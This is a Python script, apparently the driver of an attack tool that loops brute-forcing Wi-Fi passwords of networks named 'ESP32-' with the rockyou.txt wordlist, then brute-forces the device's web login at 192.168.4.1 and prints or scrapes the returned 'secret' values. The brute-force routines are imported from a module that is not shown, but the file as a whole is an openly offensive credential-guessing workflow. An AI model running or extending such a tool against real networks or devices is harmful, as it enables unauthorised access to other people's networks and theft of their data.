from bs4 import BeautifulSoup
import requests
from brute_force import brute_force_pass_site, brute_force_pass_wifi
from wifi_connect import verify_connected

# Параметры программы
site_ip = "gw"
wifi_pattern = "ESP-"

def get_secret_info(response) -> list[str]:
    soup = BeautifulSoup(response.text, 'html.parser')

    values = soup.find_all("div", attrs={"class": "value"})
    datas = []
    for value in values:
        datas.append(value.text.strip())
    return datas

def main():
    try:
        while True:
            # 1. Brute force password wifi
            ssid, _ = brute_force_pass_wifi("ESP32-", "rockyou.txt")
            if not ssid:
                print("No wifi found, retrying...")
                continue
            session, csrf_token = None, None
            while verify_connected(ssid):
                print("Watting attack...")
                api_url = f"http://192.168.4.1"
                if not session:
                    # 2. Brute force password site
                    session, password = brute_force_pass_site(api_url, "rockyou.txt")
                    if session is None:
                        continue
                try:
                    response = session.post("http://192.168.4.1/check", data={'username': 'daicaduy',
                                                                               'password': password})#, headers={"csrf-token": csrf_token})
                    #datas = get_secret_info(response)
                    print(response.text)
                except requests.RequestException as e:
                    print("The connection is interrupted, is connecting...")
                    session, csrf_token = None, None
    except KeyboardInterrupt:
        print("Exiting...")


if __name__ == '__main__':
    main()